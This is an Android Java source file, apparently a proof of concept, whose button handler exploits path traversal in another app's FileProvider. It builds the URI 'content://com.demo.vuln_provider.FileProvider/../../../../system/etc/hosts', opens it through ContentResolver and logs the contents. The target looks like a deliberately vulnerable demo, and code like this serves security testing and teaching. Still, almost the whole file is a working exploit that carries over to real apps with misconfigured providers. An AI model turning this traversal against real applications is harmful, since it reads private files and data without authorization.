package com.demo.poc_fileprovider;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ContentResolver;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import java.io.FileInputStream;
import java.io.IOException;

public class MainActivity extends AppCompatActivity {

    private static String TAG = "MainActivity";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button Button1 = (Button) findViewById(R.id.button);
        Button1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //拿取权限
                String authorities = "com.demo.vuln_provider.FileProvider";
                String fileUri="content://" + authorities + "/../../../../system/etc/hosts";
                ContentResolver cr = getContentResolver();
                try {
                    FileInputStream in = (FileInputStream) cr.openInputStream(Uri.parse(fileUri));
                    byte[] buff =new byte[in.available()];
                    in.read(buff);
                    Log.e(TAG,new String(buff));
                } catch ( IOException e) {
                    e.printStackTrace();
                }
            }
        });
    }
}